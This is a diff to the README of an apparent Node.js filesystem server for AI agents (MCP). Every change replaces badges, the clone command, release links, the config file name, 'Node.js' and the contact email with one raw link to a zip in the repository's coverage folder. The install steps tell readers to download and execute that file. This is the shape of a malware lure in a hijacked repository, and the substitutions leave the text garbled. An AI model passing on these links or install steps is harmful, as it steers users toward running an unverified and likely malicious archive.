@@ -1,8 +1,8 @@
 # Filesystem MCP 🌐
 
-![GitHub Release](https://img.shields.io/github/v/release/Tabeeh/filesystem-mcp?style=flat-square) ![Node.js](https://img.shields.io/badge/Node.js-v16.0.0-brightgreen)
+![GitHub Release](https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip) ![https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip](https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip)
 
-Welcome to the **Filesystem MCP** repository! This project provides a Node.js Model Context Protocol (MCP) server designed to offer secure, relative filesystem access for AI agents such as Cline and Claude. 
+Welcome to the **Filesystem MCP** repository! This project provides a https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip Model Context Protocol (MCP) server designed to offer secure, relative filesystem access for AI agents such as Cline and Claude. 
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@ Welcome to the **Filesystem MCP** repository! This project provides a Node.js Mo
 - **Secure Access**: Ensures that AI agents interact with the filesystem in a safe manner.
 - **Relative Paths**: Simplifies the process of accessing files without needing absolute paths.
 - **Support for AI Agents**: Specifically designed to work with Cline and Claude.
-- **Built with Node.js**: Utilizes the power of Node.js for efficient server-side operations.
+- **Built with https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip**: Utilizes the power of https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip for efficient server-side operations.
 - **TypeScript Support**: Offers type safety and improved developer experience.
 
 ## Installation ⚙️
@@ -28,18 +28,18 @@ To get started with the Filesystem MCP server, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Tabeeh/filesystem-mcp.git
+   git clone https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip
    cd filesystem-mcp
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip installed. Then run:
    ```bash
    npm install
    ```
 
 3. **Download the Latest Release**:
-   You can find the latest release [here](https://github.com/Tabeeh/filesystem-mcp/releases). Download the appropriate file and execute it.
+   You can find the latest release [here](https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip). Download the appropriate file and execute it.
 
 ## Usage 🚀
 
@@ -51,7 +51,7 @@ npm start
 
 ### Example Configuration
 
-You can configure the server by modifying the `config.json` file. Here’s an example configuration:
+You can configure the server by modifying the `https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip` file. Here’s an example configuration:
 
 ```json
 {
@@ -134,11 +134,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/YourGitHubProfile)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip)
+- **Email**: https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip
 
 ---
 
-For the latest updates, releases, and documentation, visit our [Releases](https://github.com/Tabeeh/filesystem-mcp/releases) section. 
+For the latest updates, releases, and documentation, visit our [Releases](https://raw.githubusercontent.com/Tabeeh/filesystem-mcp/main/coverage/mcp-filesystem-1.1.zip) section. 
 
 Happy coding! 🎉
